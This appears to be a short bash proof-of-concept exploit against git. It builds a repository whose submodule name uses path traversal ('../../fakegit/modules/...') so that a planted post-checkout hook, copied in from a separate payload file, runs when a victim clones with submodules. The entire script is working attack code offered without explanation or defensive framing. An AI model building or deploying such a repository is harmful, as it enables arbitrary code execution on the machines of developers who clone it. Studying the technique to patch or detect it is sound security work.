#!/bin/bash
evil_submodule="zemodule"
empty_submodule="https://github.com/pielgrzym/noop"

rm -rf evil_git_repo

git init evil_git_repo --bare
mv evil_git_repo/hooks/post-update.sample evil_git_repo/hooks/post-update
chmod a+x evil_git_repo/hooks/post-update

temp_repo=$(mktemp -d)
git clone evil_git_repo $temp_repo
old_dir=$(pwd)
cd $temp_repo
export GIT_WORK_TREE=$temp_repo
mkdir -p fakegit/modules
git submodule add $empty_submodule $evil_submodule
git submodule add $empty_submodule error
mv .git/modules/$evil_submodule fakegit/modules/$evil_submodule
cp $old_dir/payload.txt fakegit/modules/$evil_submodule/hooks/post-checkout
chmod 755 fakegit/modules/$evil_submodule/hooks/post-checkout
git config -f .gitmodules --rename-section submodule.$evil_submodule submodule.../../fakegit/modules/$evil_submodule
sed -i 's/\.git/fakegit/' $evil_submodule/.git

git add .
git commit -m 'Initial commit'
git push
rm -rf $temp_repo
